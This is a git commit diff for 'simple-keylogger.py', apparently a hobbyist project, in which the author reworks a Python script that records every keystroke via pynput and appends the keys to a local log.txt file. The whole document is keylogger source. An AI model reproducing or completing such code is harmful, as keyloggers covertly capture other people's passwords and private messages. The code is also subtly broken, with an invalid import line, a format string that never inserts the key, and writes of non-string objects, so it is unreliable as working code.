926ad97b4594c7d5b5434c98bdc712f84c07c4e3
Enzo Frederico <101186119+Enzofmlg@users.noreply.github.com>
2023-11-06 17:48:32 -0300

    simple-keylogger.py
    developing older project...

--- simple-keylogger.py
+++ simple-keylogger.py
@@ -1,12 +1,34 @@
+# Developing...
 import pynput
-import pynput.keyboard import Key, Listener
-import logging
+import pynput.keyboard 
+import Key, Listener
 
-log_dir = r"C:/Path/To/Keylogger"
-loggin.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s')
+from pynput.keyboard import Key, Listener
+count = 0
+keys = []
 
 def on_press(key):
-    logging.info(str(key))
+    global keys, count
 
-when Listener (on_press=on_press) as listener:
+    keys.append(key)
+    count += 1
+    print("[0] pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            f.write(key)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+
